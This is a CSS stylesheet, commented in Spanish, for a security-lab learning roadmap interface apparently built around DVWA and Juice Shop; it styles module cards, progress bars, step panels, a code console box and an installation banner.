.roadmap-global-subtitulo {
  font-size: 14px;
  color: var(--texto-muted);
  line-height: 1.5;
}

.roadmap-labs-lista {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.roadmap-lab-card {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 24px;
}

.roadmap-card-tags {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 10px;
}

.roadmap-cat-badge {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  color: var(--acento2);
  background: rgba(77, 166, 255, 0.1);
  border: 1px solid rgba(77, 166, 255, 0.25);
  padding: 1px 7px;
  border-radius: 4px;
}

.roadmap-lab-titulo {
  font-size: 20px;
  font-weight: 700;
  margin-bottom: 6px;
  color: #ffffff;
}

.roadmap-lab-desc {
  font-size: 13px;
  color: var(--texto-muted);
  line-height: 1.5;
  margin-bottom: 16px;
  max-width: 70ch;
}

.roadmap-progreso-resumen {
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  border-radius: 6px;
  padding: 12px 16px;
  margin-bottom: 18px;
}

.progreso-textos {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 6px;
  font-size: 12px;
}

.progreso-porcentaje-label {
  color: var(--acento);
  font-weight: 600;
}

.progreso-pasos-label {
  color: var(--texto-muted);
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
}

.barra-progreso-mini {
  height: 4px;
  background: #111317;
  border-radius: 4px;
  overflow: hidden;
}

.barra-progreso-mini-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 4px;
  transition: width 0.2s ease;
}

.chips-modulos-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
  gap: 8px;
  margin-top: 8px;
  margin-bottom: 18px;
}

.chip-modulo-preview {
  display: flex;
  align-items: center;
  gap: 6px;
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  border-radius: 4px;
  padding: 6px 10px;
  cursor: pointer;
  transition: border-color 0.15s ease;
}

.chip-modulo-preview:hover {
  border-color: var(--acento);
  background: #171b1f;
}

.chip-modulo-num {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  font-weight: 700;
  color: var(--acento);
}

.chip-modulo-nombre {
  font-size: 12px;
  color: var(--texto);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  flex: 1;
}

.chip-modulo-nivel {
  font-family: 'JetBrains Mono', monospace;
  font-size: 9px;
  text-transform: uppercase;
  padding: 1px 5px;
  border-radius: 3px;
}

.chip-modulo-nivel.nivel-básico {
  color: #00e08a;
  background: rgba(0, 224, 138, 0.1);
}

.chip-modulo-nivel.nivel-intermedio {
  color: #ffaa00;
  background: rgba(255, 170, 0, 0.1);
}

.chip-modulo-nivel.nivel-avanzado {
  color: #c084fc;
  background: rgba(168, 85, 247, 0.1);
}

.roadmap-card-acciones {
  display: flex;
  gap: 10px;
  align-items: center;
}

/* Mejoras a GridLabs */
.cuadro-lab-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  width: 100%;
  margin-bottom: 10px;
}

.cuadro-lab-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
  width: 100%;
  padding: 12px 20px 16px;
  border-top: 1px solid var(--borde);
  margin-top: auto;
}

.cuadro-modulos-count {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  color: var(--texto-muted);
}

.cuadro-ver-roadmap {
  font-size: 12px;
  color: var(--acento);
  font-weight: 600;
  transition: transform 0.15s ease;
}

.cuadro-lab:hover .cuadro-ver-roadmap {
  transform: translateX(4px);
}

@media (max-width: 900px) {
  .roadmap-layout-split {
    grid-template-columns: 1fr;
  }

  .detalle-banner-control {
    flex-direction: column;
    align-items: flex-start;
  }

  .banner-control-acciones {
    width: 100%;
    flex-wrap: wrap;
  }

  .roadmap-header-info {
    flex-direction: column;
    align-items: flex-start;
    gap: 12px;
  }
}

/* =========================================================
   ROADMAP REDISEÑADO — Estructura de Tarjetas de Nivel
   ========================================================= */

/* Barra de progreso global */
.rl-progreso-global {
  margin-bottom: 28px;
}

.rl-progreso-textos {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}

.rl-seccion-nombre {
  font-family: var(--fuente-mono);
  font-size: 12px;
  font-weight: 700;
  color: var(--texto);
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.rl-progreso-stats {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--acento);
  font-weight: 600;
}

.rl-barra-global {
  height: 4px;
  background: var(--superficie-alt);
  border-radius: 4px;
  overflow: hidden;
}

.rl-barra-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 4px;
  transition: width 0.4s ease;
}

/* Encabezado del itinerario */
.rl-itinerario-header {
  margin-bottom: 16px;
}

.rl-itinerario-titulo {
  font-size: 20px;
  font-weight: 700;
  color: #ffffff;
}

/* ——— Grid de tarjetas de módulo ——— */
.rl-modulos-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 16px;
  margin-bottom: 32px;
}

.rl-mod-card {
  position: relative;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  padding: 18px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 10px;
  cursor: pointer;
  transition: box-shadow 0.2s ease, border-color 0.2s ease, transform 0.15s ease;
  text-align: left;
}

.rl-mod-card:hover {
  border-color: #3b424f;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  transform: translateY(-2px);
}

.rl-mod-card--activo {
  border-color: rgba(0, 224, 138, 0.4);
  box-shadow: 0 0 0 1px rgba(0, 224, 138, 0.15);
}

.rl-mod-card--completado {
  border-color: rgba(0, 224, 138, 0.25);
  background: rgba(0, 224, 138, 0.02);
}

.rl-mod-card--pendiente {
  opacity: 0.7;
}

.rl-mod-card--pendiente:hover {
  opacity: 1;
}

/* Top de la tarjeta: solo número */
.rl-mod-card-top {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  margin-bottom: 8px;
}

.rl-mod-numero-solo {
  font-family: var(--fuente-mono);
  font-size: 13px;
  font-weight: 800;
  color: var(--texto-muted);
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  width: 28px;
  height: 28px;
  border-radius: 6px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s ease;
}

.rl-mod-card--activo .rl-mod-numero-solo {
  color: var(--acento);
  border-color: rgba(0, 224, 138, 0.4);
  background: rgba(0, 224, 138, 0.1);
}

.rl-mod-card--completado .rl-mod-numero-solo {
  color: var(--acento);
  border-color: rgba(0, 224, 138, 0.3);
}

/* Ícono del módulo */
.rl-mod-icono-wrap {
  width: 52px;
  height: 52px;
  margin: 6px 0 12px;
  padding: 10px;
  background: var(--superficie-alt);
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.rl-mod-card--activo .rl-mod-icono-wrap {
  background: rgba(0, 224, 138, 0.07);
  color: var(--acento);
}

.rl-mod-card--completado .rl-mod-icono-wrap {
  background: rgba(0, 224, 138, 0.06);
  color: var(--acento);
}

.rl-mod-icono-wrap svg {
  width: 100%;
  height: 100%;
  color: inherit;
}

.rl-mod-titulo {
  font-size: 14px;
  font-weight: 700;
  color: var(--texto);
  line-height: 1.35;
  margin-bottom: 4px;
  flex: 1;
}

.rl-mod-nivel {
  font-family: var(--fuente-mono);
  font-size: 11px;
  color: var(--texto-muted);
  margin-bottom: 14px;
}

/* Footer de la tarjeta: mini barra + conteo */
.rl-mod-footer {
  display: flex;
  align-items: center;
  gap: 10px;
  padding-top: 10px;
  border-top: 1px solid rgba(255, 255, 255, 0.04);
}

.rl-mod-mini-barra {
  flex: 1;
  height: 3px;
  background: var(--superficie-alt);
  border-radius: 3px;
  overflow: hidden;
}

.rl-mod-mini-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 3px;
  transition: width 0.3s ease;
}

.rl-mod-conteo {
  font-family: var(--fuente-mono);
  font-size: 10px;
  color: var(--texto-muted);
  white-space: nowrap;
}

/* ——— Panel del módulo activo ——— */
.rl-panel-activo {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

/* Encabezado del panel */
.rl-panel-header {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 10px;
  padding: 20px 24px;
}

.rl-panel-header-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  margin-bottom: 10px;
  flex-wrap: wrap;
}

.rl-panel-meta {
  display: flex;
  align-items: center;
  gap: 10px;
}

.rl-panel-numero-badge {
  font-family: var(--fuente-mono);
  font-size: 13px;
  font-weight: 800;
  color: var(--acento);
  background: rgba(0, 224, 138, 0.1);
  border: 1px solid rgba(0, 224, 138, 0.3);
  width: 28px;
  height: 28px;
  border-radius: 6px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
}

.rl-panel-progreso-fila {
  display: flex;
  align-items: center;
  gap: 10px;
}

.rl-prog-txt {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--texto-muted);
  white-space: nowrap;
}

.rl-barra-modulo {
  width: 120px;
  height: 5px;
  background: var(--superficie-alt);
  border-radius: 5px;
  overflow: hidden;
}

.rl-barra-modulo-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 5px;
  transition: width 0.3s ease;
}

.rl-prog-pct {
  font-family: var(--fuente-mono);
  font-size: 12px;
  font-weight: 700;
  color: var(--acento);
  min-width: 36px;
  text-align: right;
}

.rl-panel-titulo {
  font-size: 22px;
  font-weight: 700;
  color: #ffffff;
  line-height: 1.25;
}

/* ——— Lista de pasos ——— */
.rl-lista-pasos {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.rl-paso {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-left: 3px solid var(--borde);
  border-radius: 10px;
  padding: 22px 26px;
  cursor: pointer;
  text-align: left;
  transition: all 0.2s ease;
}

.rl-paso:hover {
  border-color: #3b4453;
  border-left-color: var(--acento2);
  background: var(--superficie-alt);
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
}

.rl-paso--completado {
  background: rgba(0, 224, 138, 0.025);
  border-color: rgba(0, 224, 138, 0.3);
  border-left-color: var(--acento);
}

/* Header del paso */
.rl-paso-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
}

.rl-paso-check {
  width: 22px;
  height: 22px;
  border: 2px solid var(--borde);
  border-radius: 6px;
  background: var(--superficie-alt);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 12px;
  font-weight: 800;
  color: #06110c;
  flex-shrink: 0;
  transition: all 0.2s ease;
}

.rl-paso:hover .rl-paso-check {
  border-color: var(--acento);
}

.rl-paso-check--on {
  background: var(--acento);
  border-color: var(--acento);
}

.rl-paso-num {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  color: var(--acento);
  background: var(--acento-suave);
  padding: 3px 9px;
  border-radius: 4px;
  flex-shrink: 0;
}

.rl-paso--completado .rl-paso-num {
  background: rgba(0, 224, 138, 0.08);
}

.rl-paso-titulo {
  font-family: var(--fuente-display);
  font-size: 17px;
  font-weight: 700;
  color: #ffffff;
  line-height: 1.3;
}

.rl-paso--completado .rl-paso-titulo {
  color: #93e6be;
}

/* Cuerpo de texto explicativo */
.rl-paso-cuerpo-texto {
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin-bottom: 18px;
}

.rl-paso-parrafo {
  font-size: 14.5px;
  color: #cbd5e1;
  line-height: 1.65;
  margin: 0;
  white-space: pre-line;
}

/* ——— Selector de Misiones / Fases del Módulo ——— */
.rl-misiones-selector {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 12px;
  flex-wrap: wrap;
}

.rl-misiones-label {
  font-family: var(--fuente-mono);
  font-size: 11.5px;
  font-weight: 700;
  color: var(--texto-muted);
  text-transform: uppercase;
  letter-spacing: 0.6px;
}

.rl-misiones-pills {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}

.rl-mision-pill {
  background: var(--superficie);
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
  font-size: 11.5px;
  font-weight: 600;
  padding: 5px 12px;
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
  display: inline-flex;
  align-items: center;
  gap: 5px;
}

.rl-mision-pill:hover {
  border-color: var(--acento);
  color: #ffffff;
  transform: translateY(-1px);
}

.rl-mision-pill--activo {
  background: rgba(0, 224, 138, 0.12);
  border-color: var(--acento);
  color: var(--acento);
  box-shadow: 0 0 12px rgba(0, 224, 138, 0.2);
}

.rl-mision-pill--hecho {
  border-color: rgba(0, 224, 138, 0.35);
  color: #93e6be;
}

.rl-mision-check {
  font-weight: 800;
  color: var(--acento);
}

/* ——— Misión con Diseño Táctico de Alta Visibilidad ——— */
.rl-mision-caja {
  display: flex;
  align-items: flex-start;
  gap: 14px;
  background: linear-gradient(135deg, rgba(56, 189, 248, 0.12) 0%, rgba(14, 165, 233, 0.04) 100%);
  border: 1px solid rgba(56, 189, 248, 0.32);
  border-left: 4px solid #38bdf8;
  border-radius: 10px;
  padding: 14px 18px;
  margin-bottom: 20px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2), 0 0 16px rgba(56, 189, 248, 0.08);
}

.rl-mision-tag {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  background: rgba(56, 189, 248, 0.15);
  border: 1px solid rgba(56, 189, 248, 0.35);
  padding: 4px 10px;
  border-radius: 6px;
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 800;
  color: #38bdf8;
  text-transform: uppercase;
  letter-spacing: 0.8px;
  flex-shrink: 0;
}

.rl-mision-icono {
  color: #38bdf8;
  animation: pulse-sutil 3s infinite ease-in-out;
}

@keyframes pulse-sutil {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.75; transform: scale(0.96); }
}

.rl-mision-texto {
  font-family: var(--fuente-body);
  font-size: 15px;
  color: #e0f2fe;
  line-height: 1.6;
  font-weight: 500;
  padding-top: 2px;
}

/* ——— Tarjeta de Paso Independiente ——— */
.rl-paso-contenido-card {
  display: flex;
  align-items: flex-start;
  gap: 18px;
  background: linear-gradient(180deg, #10141b 0%, #0a0d12 100%);
  border: 1px solid rgba(255, 255, 255, 0.09);
  border-radius: 12px;
  padding: 22px 24px;
  margin-bottom: 22px;
  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.05);
  transition: all 0.2s ease;
}

.rl-paso-contenido-card:hover {
  border-color: rgba(0, 224, 138, 0.35);
  box-shadow: 0 10px 35px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 224, 138, 0.05);
}

.rl-paso-num-circulo {
  width: 36px;
  height: 36px;
  border-radius: 10px;
  background: linear-gradient(135deg, rgba(0, 224, 138, 0.18) 0%, rgba(0, 224, 138, 0.05) 100%);
  border: 1px solid rgba(0, 224, 138, 0.4);
  color: var(--acento);
  font-family: var(--fuente-mono);
  font-size: 16px;
  font-weight: 800;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  box-shadow: 0 0 12px rgba(0, 224, 138, 0.2);
}

.rl-paso-texto-cuerpo {
  flex: 1;
}

.rl-paso-linea {
  font-family: var(--fuente-body);
  font-size: 15px;
  color: #f1f5f9;
  line-height: 1.7;
  margin: 0 0 10px 0;
}

.rl-paso-linea:last-child {
  margin-bottom: 0;
}

/* Bullet points destacados y uniformes */
.rl-paso-bullet-item {
  display: flex;
  align-items: baseline;
  gap: 10px;
  margin: 6px 0;
  padding: 4px 8px;
  background: rgba(255, 255, 255, 0.02);
  border-radius: 6px;
}

.rl-bullet-dot {
  color: var(--acento);
  font-size: 11px;
  font-family: var(--fuente-mono);
  flex-shrink: 0;
}

.rl-bullet-texto {
  font-family: var(--fuente-body);
  font-size: 14.5px;
  color: #e2e8f0;
  line-height: 1.6;
}

/* Consola / Payload / Snippet */
.rl-consola {
  background: #06080a;
  border: 1px solid var(--borde);
  border-radius: 8px;
  overflow: hidden;
  margin-bottom: 18px;
}

.rl-consola-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 8px 14px;
  background: #0f1318;
  border-bottom: 1px solid rgba(255, 255, 255, 0.04);
}

.rl-consola-tag {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: var(--texto-muted);
  letter-spacing: 0.5px;
}

.rl-consola-btn-copiar {
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  color: var(--texto);
  font-family: var(--fuente-mono);
  font-size: 11px;
  padding: 3px 10px;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.15s ease;
  display: inline-flex;
  align-items: center;
}

.rl-consola-btn-copiar:hover {
  background: var(--acento);
  color: #06110c;
  border-color: var(--acento);
}

.rl-consola-codigo {
  margin: 0;
  padding: 14px 16px;
  overflow-x: auto;
  font-family: var(--fuente-mono);
  font-size: 12.5px;
  line-height: 1.55;
  color: #38bdf8;
  white-space: pre-wrap;
  word-break: break-all;
}

/* Navegación entre módulos */
.rl-navegacion {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 16px;
  padding-top: 20px;
  border-top: 1px solid var(--borde);
}

.rl-btn-nav {
  font-family: var(--fuente-display);
  font-size: 13px;
  font-weight: 600;
  padding: 9px 18px;
  border-radius: 6px;
}

/* Stepper interactivo de pasos individuales */
.rl-stepper {
  display: flex;
  flex-direction: column;
  gap: 16px;
  margin-bottom: 24px;
}

.rl-stepper-dots {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
  padding: 4px 0 8px;
}

.rl-dot {
  width: 28px;
  height: 6px;
  border-radius: 4px;
  border: none;
  background: var(--borde);
  cursor: pointer;
  transition: all 0.2s ease;
  padding: 0;
}

.rl-dot:hover {
  background: var(--borde-fuerte);
}

.rl-dot--current {
  background: var(--acento);
  box-shadow: 0 0 10px var(--acento-glow);
  width: 38px;
}

.rl-dot--done {
  background: rgba(0, 224, 138, 0.45);
}

.rl-dot--done.rl-dot--current {
  background: var(--acento);
}

.rl-paso--single {
  cursor: default;
  border-width: 1px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}

.rl-paso--single:hover {
  border-color: var(--borde-fuerte);
  background: var(--superficie);
}

.rl-stepper-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  margin-top: 20px;
  padding-top: 16px;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
}

.rl-stepper-contador {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--texto-muted);
  font-weight: 600;
}

.rl-btn-paso {
  font-size: 13px;
  padding: 8px 18px;
  border-radius: 6px;
  font-weight: 600;
  display: inline-flex;
  align-items: center;
  gap: 6px;
}

.rl-btn-paso:disabled {
  opacity: 0.35;
  cursor: not-allowed;
}

/* Responsive */
@media (max-width: 720px) {
  .rl-modulos-grid {
    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
  }

  .rl-panel-header-row {
    flex-direction: column;
    align-items: flex-start;
  }

  .rl-barra-modulo {
    width: 80px;
  }

  .rl-stepper-nav {
    flex-direction: column;
    align-items: stretch;
  }

  .rl-stepper-contador {
    text-align: center;
  }
}

/* =========================================================
   SENDERO DE APRENDIZAJE (ROADMAP GENERAL MINIMALISTA)
   ========================================================= */

.roadmap-camino-vista {
  max-width: 880px;
  margin: 0 auto;
  padding: 36px clamp(16px, 4vw, 32px) 80px;
}

/* Cabecera del camino */
.camino-header {
  margin-bottom: 36px;
  text-align: left;
}

.camino-titulo {
  font-family: var(--fuente-display);
  font-size: clamp(24px, 3.5vw, 32px);
  font-weight: 800;
  color: #ffffff;
  letter-spacing: -0.5px;
  margin-bottom: 6px;
}

.camino-subtitulo {
  font-size: 14px;
  color: var(--texto-muted);
  line-height: 1.55;
  max-width: 68ch;
  margin-bottom: 20px;
}

/* Tarjeta de Progreso Global Discreta */
.camino-progreso-card {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 10px;
  padding: 14px 20px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
}

.camino-progreso-top {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 10px;
  font-family: var(--fuente-mono);
  font-size: 11.5px;
}

.camino-progreso-label {
  color: var(--texto-muted);
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.camino-progreso-conteo {
  color: #ffffff;
}

.camino-progreso-conteo strong {
  color: var(--acento);
}

.camino-barra-track {
  width: 100%;
  height: 5px;
  background: var(--superficie-alt);
  border-radius: 4px;
  overflow: hidden;
}

.camino-barra-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 4px;
  transition: width 0.35s ease;
}

/* Timeline Container */
.camino-timeline-container {
  display: flex;
  flex-direction: column;
  gap: 36px;
}

/* Sección de Fase */
.camino-fase-seccion {
  display: flex;
  flex-direction: column;
  gap: 14px;
}

.camino-fase-banner {
  display: flex;
  align-items: center;
  gap: 14px;
  background: #0e1115;
  border: 1px solid var(--borde);
  border-left: 3px solid var(--acento);
  border-radius: 8px;
  padding: 12px 18px;
  text-align: left;
}

.fase-banner-icon-box {
  width: 32px;
  height: 32px;
  border-radius: 6px;
  background: var(--acento-suave);
  color: var(--acento);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.fase-banner-textos {
  display: flex;
  align-items: baseline;
  justify-content: space-between;
  flex: 1;
  flex-wrap: wrap;
  gap: 8px;
}

.fase-banner-titulo {
  font-family: var(--fuente-display);
  font-size: 15.5px;
  font-weight: 700;
  color: #ffffff;
  margin: 0;
}

.fase-banner-sub {
  font-family: var(--fuente-mono);
  font-size: 10px;
  font-weight: 700;
  color: var(--acento);
  letter-spacing: 0.5px;
}

/* Lista conectada de nodos temáticos */
.camino-nodos-lista {
  display: flex;
  flex-direction: column;
  gap: 12px;
  position: relative;
}

/* Tarjeta de Nodo en el Sendero */
.camino-nodo-card {
  display: flex;
  gap: 18px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 10px;
  padding: 18px 20px;
  cursor: pointer;
  text-align: left;
  transition: all 0.18s ease;
  position: relative;
}

.camino-nodo-card:hover {
  border-color: var(--acento);
  background: var(--superficie-alt);
  transform: translateY(-2px);
  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
}

.camino-nodo-card.nodo-completado {
  border-color: rgba(0, 224, 138, 0.3);
  background: rgba(0, 224, 138, 0.02);
}

/* Columna del hito conectado */
.nodo-hito-col {
  display: flex;
  flex-direction: column;
  align-items: center;
  flex-shrink: 0;
}

.nodo-hito-circulo {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  background: #0a0d10;
  border: 1.5px solid var(--borde);
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.18s ease;
  z-index: 2;
}

.camino-nodo-card:hover .nodo-hito-circulo {
  border-color: var(--acento);
  color: var(--acento);
}

.nodo-hito-circulo.circulo-check {
  background: var(--acento);
  border-color: var(--acento);
  color: #06110c;
  font-size: 13px;
  font-weight: 900;
}

.nodo-hito-linea {
  width: 2px;
  flex: 1;
  background: var(--borde);
  margin-top: 6px;
  min-height: 16px;
}

.camino-nodo-card:last-child .nodo-hito-linea {
  display: none;
}

/* Cuerpo del nodo */
.nodo-cuerpo {
  display: flex;
  flex-direction: column;
  flex: 1;
  gap: 6px;
}

.nodo-cuerpo-top {
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
  gap: 8px;
}

.nodo-badges-fila {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}

/* Badge distintivo del Laboratorio */
.nodo-lab-badge {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-family: var(--fuente-mono);
  font-size: 10.5px;
  font-weight: 700;
  padding: 2px 8px;
  border-radius: 4px;
}

.badge-dvwa {
  background: rgba(0, 224, 138, 0.1);
  color: #00e08a;
  border: 1px solid rgba(0, 224, 138, 0.25);
}

.badge-juice {
  background: rgba(56, 189, 248, 0.1);
  color: #38bdf8;
  border: 1px solid rgba(56, 189, 248, 0.25);
}

.nodo-badge-completado {
  font-family: var(--fuente-mono);
  font-size: 10px;
  color: var(--acento);
  background: var(--acento-suave);
  padding: 1px 6px;
  border-radius: 3px;
}

.nodo-cta-link {
  font-family: var(--fuente-mono);
  font-size: 11.5px;
  font-weight: 600;
  color: var(--acento);
  transition: transform 0.15s ease;
}

.camino-nodo-card:hover .nodo-cta-link {
  transform: translateX(3px);
}

.nodo-titulo {
  font-family: var(--fuente-display);
  font-size: 16px;
  font-weight: 700;
  color: #ffffff;
  margin: 1px 0 0;
  line-height: 1.3;
}

.camino-nodo-card.nodo-completado .nodo-titulo {
  color: #a7f3d0;
}

.nodo-descripcion {
  font-size: 13px;
  color: var(--texto-muted);
  line-height: 1.5;
  margin: 0;
}

/* ─── Bloque de Instrucción Concreta en el Paso del Lab ─── */
.rl-paso-accion-bloque {
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 12px 16px;
  margin-bottom: 14px;
}

.rl-bloque-subtitulo {
  display: block;
  font-family: var(--fuente-mono);
  font-size: 10px;
  font-weight: 700;
  color: var(--texto-muted);
  letter-spacing: 0.6px;
  margin-bottom: 6px;
}

.rl-paso-accion-bloque .rl-paso-como {
  margin-bottom: 0;
  color: #f1f5f9;
  font-size: 14px;
  line-height: 1.6;
}

/* =========================================================
   MÓDULO DE INSTALACIÓN Y PREPARACIÓN DE HERRAMIENTAS
   ========================================================= */

/* Banner destacado en la Grilla de Labs */
.grid-instalacion-banner {
  background: linear-gradient(135deg, rgba(16, 24, 39, 0.95) 0%, rgba(13, 27, 42, 0.95) 100%);
  border: 1px solid rgba(56, 189, 248, 0.4);
  box-shadow: 0 8px 32px rgba(56, 189, 248, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.1);
  border-radius: 16px;
  padding: 24px 28px;
  margin-bottom: 28px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 24px;
  cursor: pointer;
  position: relative;
  overflow: hidden;
  transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
}

.grid-instalacion-banner::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 4px;
  height: 100%;
  background: linear-gradient(180deg, #38bdf8, #00e08a);
  border-radius: 4px 0 0 4px;
}

.grid-instalacion-banner:hover {
  transform: translateY(-3px);
  border-color: #38bdf8;
  box-shadow: 0 12px 40px rgba(56, 189, 248, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.18);
  background: linear-gradient(135deg, rgba(20, 30, 48, 0.98) 0%, rgba(16, 34, 54, 0.98) 100%);
}

.instalacion-banner-izq {
  display: flex;
  align-items: center;
  gap: 20px;
  flex: 1;
}

.instalacion-banner-icono {
  width: 52px;
  height: 52px;
  border-radius: 12px;
  background: rgba(56, 189, 248, 0.12);
  border: 1px solid rgba(56, 189, 248, 0.3);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  transition: transform 0.2s ease, background-color 0.2s;
}

.instalacion-banner-icono svg {
  width: 28px;
  height: 28px;
  color: #38bdf8;
  stroke-width: 1.8;
}

.grid-instalacion-banner:hover .instalacion-banner-icono {
  transform: rotate(30deg) scale(1.06);
  background: rgba(56, 189, 248, 0.2);
  border-color: #38bdf8;
}

.instalacion-banner-texto {
  display: flex;
  flex-direction: column;
  gap: 4px;
  text-align: left;
}

.instalacion-banner-fase {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 0.8px;
  color: #38bdf8;
  text-transform: uppercase;
}

.instalacion-banner-titulo {
  font-family: var(--fuente-display);
  font-size: 20px;
  font-weight: 700;
  color: #ffffff;
  margin: 0;
  line-height: 1.3;
}

.instalacion-banner-desc {
  font-size: 13.5px;
  color: #94a3b8;
  margin: 0;
  line-height: 1.45;
  max-width: 68ch;
}

.instalacion-banner-tags {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
  margin-top: 10px;
}

.instalacion-tag {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: #38bdf8;
  background: rgba(56, 189, 248, 0.1);
  border: 1px solid rgba(56, 189, 248, 0.25);
  padding: 3px 9px;
  border-radius: 4px;
}

.instalacion-banner-der {
  display: flex;
  flex-direction: column;
  align-items: flex-end;
  gap: 8px;
  flex-shrink: 0;
}

.instalacion-badge-pasos,
.instalacion-badge-tiempo {
  font-family: var(--fuente-mono);
  font-size: 11.5px;
  font-weight: 600;
  color: #cbd5e1;
  background: rgba(255, 255, 255, 0.06);
  border: 1px solid var(--borde);
  padding: 4px 10px;
  border-radius: 6px;
}

.instalacion-cta {
  font-family: var(--fuente-display);
  font-size: 13.5px;
  font-weight: 700;
  color: #06110c;
  background: #38bdf8;
  padding: 8px 16px;
  border-radius: 8px;
  margin-top: 4px;
  transition: background-color 0.2s, transform 0.15s;
}

.grid-instalacion-banner:hover .instalacion-cta {
  background: #7dd3fc;
  transform: translateX(2px);
}

/* Estado de conectividad de la Pi */
.pi-estado-verificando {
  display: flex;
  align-items: center;
  gap: 12px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 10px;
  padding: 16px 20px;
  margin-bottom: 24px;
  font-family: var(--fuente-mono);
  font-size: 13px;
  color: var(--texto-muted);
}

.pi-spinner {
  width: 16px;
  height: 16px;
  border: 2px solid rgba(56, 189, 248, 0.2);
  border-top-color: #38bdf8;
  border-radius: 50%;
  animation: pi-spin 0.8s linear infinite;
}
